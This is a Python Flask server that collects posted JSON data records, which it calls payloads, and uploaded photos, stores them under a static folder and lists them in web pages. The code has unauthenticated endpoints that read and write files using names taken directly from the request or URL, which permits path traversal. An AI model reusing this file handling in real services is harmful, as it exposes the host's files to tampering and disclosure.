from flask import (
    Flask,
    request,
    render_template,
)
import base64
from os import walk
import json
import numpy as np
import cv2
import os


def save_img(img):
    path = os.path.join("static", "fotos")
    print(f"path: {path}")
    if not os.path.isdir(path):
        print(f"not exist, creating {path}")
        os.mkdir(path)
    count = len(os.listdir(path))+1

    path_and_file = os.path.join(path, "img_"+str(count)+".jpg")
    print(f"path_and_file: {path_and_file}")
    cv2.imwrite(path_and_file, img)
    print("Image Saved")


app = Flask(__name__)


@app.route('/', methods=['GET'])
def home():
    return render_template("index.html")


@app.route('/payloads')
def showPayloads():
    payload_filenames = next(walk("./static/payloads"), (None, None, []))[2]
    amount_payload = len(payload_filenames)

    return render_template("showPayloads.html",
                           amount_executions=amount_payload,
                           filenames=payload_filenames
                           )


@app.route('/payloads/<payload_name>')
def currentPayload(payload_name):
    with open(f"static/payloads/{payload_name}") as file:
        return json.loads(json.dumps(json.loads(str(file.read())), indent=4, sort_keys=False))


@app.route('/fotos')
def showPhotos():
    photo_filenames = next(walk("./static/fotos"), (None, None, []))[2]
    print(photo_filenames)
    amount_photos = len(photo_filenames)
    return render_template("showPhotos.html",
                           amount_executions=amount_photos,
                           filenames=photo_filenames
                           )


@app.route('/sendData', methods=['POST'])
def sendData():
    
    received_data = json.loads(request.get_json())
    current_id = received_data['payload']['execucao_atual']

    data_name = f"payload{current_id}.json"
    data_file = open("static/payloads/"+data_name, "w+")
    data_file.write(json.dumps(received_data, indent=4, sort_keys=False))
    data_file.close()

    return 'ok'


@app.route('/receivePhoto', methods=['POST'])
def receivingPhoto():
    print("photo received!")
    received = request
    img = None
    if received.files:
        print(received.files['imageFile'])
        # convert string of image data to uint8
        file = received.files['imageFile']
        nparr = np.fromstring(file.read(), np.uint8)
        # decode image
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        #h, w, _ = img.shape = img.shape
        #cv2.putText(img, "Hello World!!!", (x*0.7, y*0.7), cv2.FONT_HERSHEY_SIMPLEX, 2, 255)
        save_img(img)

        return "[SUCCESS] Image Received", 201
    return "################ something went wrong ########################", 201


if __name__ == "__main__":
    server_port = 80
    app.run(host='0.0.0.0', port=server_port, debug=False)
